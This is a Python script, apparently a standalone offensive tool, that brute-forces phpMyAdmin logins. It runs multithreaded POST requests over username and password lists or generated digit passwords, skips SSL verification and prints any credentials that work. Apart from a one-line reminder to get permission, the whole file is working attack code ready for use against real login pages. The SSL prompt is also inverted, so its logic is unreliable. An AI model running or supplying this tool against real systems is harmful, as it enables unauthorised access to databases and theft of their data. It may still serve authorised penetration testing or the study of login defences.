# -*- coding: utf-8 -*-
import requests
import time
import sys
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

# === Functions ===

def read_file_lines(file_path):
    """Read lines from file with error handling"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[Error] File not found: {file_path}")
        sys.exit(1)
    except Exception as e:
        print(f"[Error] Could not read file: {e}")
        sys.exit(1)

def generate_passwords(min_len=1, max_len=4, chars='0123456789'):
    """Generate passwords on the fly"""
    passwords = []
    for length in range(min_len, max_len + 1):
        passwords.extend(''.join(p) for p in itertools.product(chars, repeat=length))
    return passwords

def try_login(url, username, password, verify_ssl=False, timeout=5):
    """Try login with given credentials and return (success, username, password)"""
    try:
        payload = {
            'pma_username': username,
            'pma_password': password,
            'server': '1'
        }
        response = requests.post(
            url,
            data=payload,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        success = "phpMyAdmin" in response.text and "Logout" in response.text
        return success, username, password
    except requests.RequestException as e:
        return False, username, password

def brute_force(url, usernames, passwords, threads=20, verify_ssl=False):
    """Main brute force loop with multithreading"""
    print("\n[+] Starting attack")
    print(f"[+] Target: {url}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Usernames: {len(usernames)}")
    print(f"[+] Passwords: {len(passwords)}")
    print(f"[+] Total combinations: {len(usernames) * len(passwords)}")

    start_time = time.time()
    found = False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []

        # Create tasks for all combinations
        for username in usernames:
            for password in passwords:
                futures.append(
                    executor.submit(
                        try_login, url, username, password, verify_ssl
                    )
                )

        # Process results
        for future in as_completed(futures):
            success, username, password = future.result()
            if success:
                print(f"\n\n[+] SUCCESS: {username}:{password}")
                found = True
                executor.shutdown(wait=False)
                break

            # Optional: Progress indicator
            print(".", end='', flush=True)

    if not found:
        print("\n\n[-] No valid credentials found")

    print(f"[+] Execution time: {time.time() - start_time:.2f} sec")

# === Main program ===
if __name__ == "__main__":
    print("[!] Make sure you have permission to test this system.")
    
    # Input settings via console
    target_url = input("Enter login page URL (e.g., http://localhost/phpmyadmin): ").strip()
    
    username_mode = input("Choose username mode: (1) File, (2) Single username: ").strip()
    
    usernames = []
    if username_mode == "1":
        userfile = input("Path to username file: ").strip()
        usernames = read_file_lines(userfile)
    elif username_mode == "2":
        single_user = input("Enter single username: ").strip()
        usernames = [single_user]
    else:
        print("[Error] Invalid choice")
        sys.exit(1)

    password_mode = input("Choose password mode: (1) File, (2) Generate: ").strip()
    passwords = []
    
    if password_mode == "1":
        passfile = input("Path to password file: ").strip()
        passwords = read_file_lines(passfile)
    elif password_mode == "2":
        min_len = int(input("Minimum password length (default 1): ") or "1")
        max_len = int(input("Maximum password length (default 4): ") or "4")
        chars = input("Charset (default '0123456789'): ") or "0123456789"
        passwords = generate_passwords(min_len, max_len, chars)
    else:
        print("[Error] Invalid choice")
        sys.exit(1)

    threads = int(input("Number of threads (default 20): ") or "20")
    verify_ssl = input("Verify SSL? (y/N): ").strip().lower() != "y"

    # Start attack
    brute_force(target_url, usernames, passwords, threads, verify_ssl)